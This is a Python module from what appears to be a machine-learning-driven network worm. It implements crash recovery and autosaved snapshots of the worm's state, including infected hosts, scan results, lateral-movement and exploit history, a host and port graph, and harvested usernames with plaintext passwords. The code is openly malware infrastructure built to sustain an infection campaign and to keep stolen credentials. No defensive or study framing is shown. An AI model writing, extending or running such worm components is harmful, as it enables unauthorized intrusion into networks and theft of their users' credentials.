"""
Wormy ML Network Worm - State Persistence Manager
Provides snapshot, recovery, and checkpoint capabilities for worm state.
"""

import json
import os
import shutil
import threading
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

from utils.logger import logger


@dataclass
class WormSnapshot:
    """Complete worm state snapshot"""

    timestamp: str
    version: str = "2.0"
    infected_hosts: List[str] = field(default_factory=list)
    failed_targets: List[str] = field(default_factory=list)
    scan_results: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    lateral_history: List[Dict] = field(default_factory=list)
    exploit_history: List[Dict] = field(default_factory=list)
    stats: Dict = field(default_factory=dict)
    knowledge_graph: Dict = field(default_factory=dict)
    rl_agent_state: Optional[str] = None
    config_overrides: Dict = field(default_factory=dict)
    detection_events: List[Dict] = field(default_factory=list)
    swarm_state: Dict = field(default_factory=dict)

    @property
    def infection_count(self) -> int:
        return len(self.infected_hosts)

    @property
    def discovery_count(self) -> int:
        return len(self.scan_results)

    @property
    def credential_count(self) -> int:
        return len(self.credentials)


class StatePersistenceManager:
    """
    Manages worm state persistence with snapshots, checkpoints, and recovery.

    Features:
    - Automatic periodic snapshots
    - Manual save/load
    - State recovery after crash
    - Snapshot history with rotation
    - Incremental checkpoints
    - State diffing for efficient saves
    """

    def __init__(
        self,
        snapshot_dir: str = "saved/snapshots",
        max_snapshots: int = 10,
        auto_save_interval: int = 60,
    ):
        self.snapshot_dir = snapshot_dir
        self.max_snapshots = max_snapshots
        self.auto_save_interval = auto_save_interval
        self._lock = threading.RLock()
        self._auto_save_thread = None
        self._running = False
        self._last_snapshot_hash = None

        os.makedirs(snapshot_dir, exist_ok=True)

        logger.info(
            f"StatePersistenceManager initialized: {snapshot_dir} "
            f"(max={max_snapshots}, interval={auto_save_interval}s)"
        )

    def create_snapshot(self, worm_core) -> str:
        """Create a complete state snapshot from WormCore"""
        with self._lock:
            snapshot = WormSnapshot(
                timestamp=datetime.now().isoformat(),
                infected_hosts=list(worm_core.infected_hosts),
                failed_targets=list(worm_core.failed_targets),
                scan_results=list(worm_core.scan_results),
                stats=dict(worm_core.stats),
                detection_events=list(getattr(worm_core, "_detection_events", [])),
            )

            # Extract credentials from cred_manager
            if hasattr(worm_core, "cred_manager") and worm_core.cred_manager:
                snapshot.credentials = [
                    {
                        "username": c.username,
                        "password": c.password,
                        "service": c.service,
                        "source": c.source,
                        "success_rate": c.success_rate,
                    }
                    for c in worm_core.cred_manager.credentials.values()
                    if c.success_count > 0
                ]

            # Extract lateral movement history from host_monitor
            if hasattr(worm_core, "host_monitor") and worm_core.host_monitor:
                lateral_history = []
                for ip, host_state in worm_core.host_monitor.hosts.items():
                    for lm in host_state.lateral_movement_history:
                        lateral_history.append({"source": ip, **lm})
                snapshot.lateral_history = lateral_history

            # Extract knowledge graph state
            if hasattr(worm_core, "knowledge_graph") and worm_core.knowledge_graph:
                kg = worm_core.knowledge_graph
                snapshot.knowledge_graph = {
                    "nodes": {
                        ip: {
                            "os": node.os_guess,
                            "status": node.status,
                            "ports": node.open_ports,
                        }
                        for ip, node in kg.nodes.items()
                    },
                    "edges": [
                        {"from": e.source, "to": e.target, "type": e.edge_type}
                        for e in kg.edges
                    ],
                }

            # Save RL agent state if available
            if hasattr(worm_core, "rl_agent") and worm_core.rl_agent:
                try:
                    rl_path = os.path.join(self.snapshot_dir, "rl_agent_state.json")
                    worm_core.rl_agent.save(rl_path)
                    snapshot.rl_agent_state = "rl_agent_state.json"
                except Exception as e:
                    logger.debug(f"Could not save RL agent state: {e}")

            # Save snapshot to file
            snapshot_path = self._get_snapshot_path(snapshot.timestamp)
            snapshot_data = asdict(snapshot)

            with open(snapshot_path, "w") as f:
                json.dump(snapshot_data, f, indent=2, default=str)

            # Rotate old snapshots
            self._rotate_snapshots()

            logger.success(
                f"Snapshot saved: {snapshot_path} "
                f"({snapshot.infection_count} infected, {snapshot.discovery_count} discovered)"
            )
            return snapshot_path

    def restore_snapshot(self, snapshot_path: str, worm_core) -> bool:
        """Restore worm state from a snapshot"""
        with self._lock:
            try:
                with open(snapshot_path, "r") as f:
                    snapshot_data = json.load(f)

                snapshot = WormSnapshot(**snapshot_data)

                # Restore infected hosts
                worm_core.infected_hosts = set(snapshot.infected_hosts)
                worm_core.failed_targets = set(snapshot.failed_targets)
                worm_core.scan_results = list(snapshot.scan_results)
                worm_core.stats.update(snapshot.stats)

                # Restore detection events
                if hasattr(worm_core, "_detection_events"):
                    worm_core._detection_events = list(snapshot.detection_events)

                # Restore credentials
                if hasattr(worm_core, "cred_manager") and worm_core.cred_manager:
                    for cred_data in snapshot.credentials:
                        worm_core.cred_manager.add_discovered_credential(
                            username=cred_data["username"],
                            password=cred_data["password"],
                            source=cred_data.get("source", "snapshot"),
                        )

                # Restore knowledge graph
                if hasattr(worm_core, "knowledge_graph") and worm_core.knowledge_graph:
                    kg = worm_core.knowledge_graph
                    for ip, node_data in snapshot.knowledge_graph.get("nodes", {}).items():
                        kg.add_host(
                            ip,
                            os_guess=node_data.get("os", "Unknown"),
                            status=node_data.get("status", "discovered"),
                            ports=node_data.get("ports", []),
                        )
                        if node_data.get("status") == "infected":
                            kg.mark_infected(ip, "snapshot_restore")

                # Restore RL agent state
                if snapshot.rl_agent_state and hasattr(worm_core, "rl_agent"):
                    rl_path = os.path.join(self.snapshot_dir, snapshot.rl_agent_state)
                    if os.path.exists(rl_path):
                        try:
                            worm_core.rl_agent.load(rl_path)
                            logger.success("RL agent state restored")
                        except Exception as e:
                            logger.warning(f"Could not restore RL agent: {e}")

                logger.success(
                    f"Snapshot restored: {snapshot_path} "
                    f"({snapshot.infection_count} infected, {snapshot.credential_count} creds)"
                )
                return True

            except Exception as e:
                logger.error(f"Failed to restore snapshot: {e}")
                return False

    def list_snapshots(self) -> List[Dict]:
        """List all available snapshots"""
        snapshots = []
        for filename in sorted(os.listdir(self.snapshot_dir)):
            if filename.startswith("snapshot_") and filename.endswith(".json"):
                filepath = os.path.join(self.snapshot_dir, filename)
                try:
                    with open(filepath, "r") as f:
                        data = json.load(f)
                    snapshots.append(
                        {
                            "filename": filename,
                            "path": filepath,
                            "timestamp": data.get("timestamp", "unknown"),
                            "infected_count": len(data.get("infected_hosts", [])),
                            "discovery_count": len(data.get("scan_results", [])),
                            "credential_count": len(data.get("credentials", [])),
                            "size_bytes": os.path.getsize(filepath),
                        }
                    )
                except Exception:
                    pass
        return snapshots

    def get_latest_snapshot(self) -> Optional[str]:
        """Get the path to the latest snapshot"""
        snapshots = self.list_snapshots()
        if snapshots:
            return snapshots[-1]["path"]
        return None

    def start_auto_save(self, worm_core) -> None:
        """Start automatic periodic saving"""
        if self._running:
            return

        self._running = True
        self._auto_save_thread = threading.Thread(
            target=self._auto_save_loop,
            args=(worm_core,),
            daemon=True,
            name="StateAutoSave",
        )
        self._auto_save_thread.start()
        logger.info(f"Auto-save started (interval={self.auto_save_interval}s)")

    def stop_auto_save(self) -> None:
        """Stop automatic saving"""
        self._running = False
        if self._auto_save_thread:
            self._auto_save_thread.join(timeout=5)
        logger.info("Auto-save stopped")

    def _auto_save_loop(self, worm_core) -> None:
        """Background loop for automatic saves"""
        while self._running:
            try:
                time.sleep(self.auto_save_interval)
                if self._running:
                    self.create_snapshot(worm_core)
            except Exception as e:
                logger.debug(f"Auto-save error: {e}")

    def _get_snapshot_path(self, timestamp: str) -> str:
        """Generate snapshot file path"""
        safe_ts = timestamp.replace(":", "-").replace(".", "_")
        return os.path.join(self.snapshot_dir, f"snapshot_{safe_ts}.json")

    def _rotate_snapshots(self) -> None:
        """Remove old snapshots beyond max_snapshots"""
        snapshots = self.list_snapshots()
        if len(snapshots) > self.max_snapshots:
            for old in snapshots[: len(snapshots) - self.max_snapshots]:
                try:
                    os.remove(old["path"])
                    logger.debug(f"Rotated old snapshot: {old['filename']}")
                except Exception:
                    pass

    def get_state_summary(self) -> Dict:
        """Get a summary of current persistence state"""
        snapshots = self.list_snapshots()
        latest = self.get_latest_snapshot()
        return {
            "snapshot_dir": self.snapshot_dir,
            "total_snapshots": len(snapshots),
            "max_snapshots": self.max_snapshots,
            "latest_snapshot": latest,
            "auto_save_running": self._running,
            "auto_save_interval": self.auto_save_interval,
        }
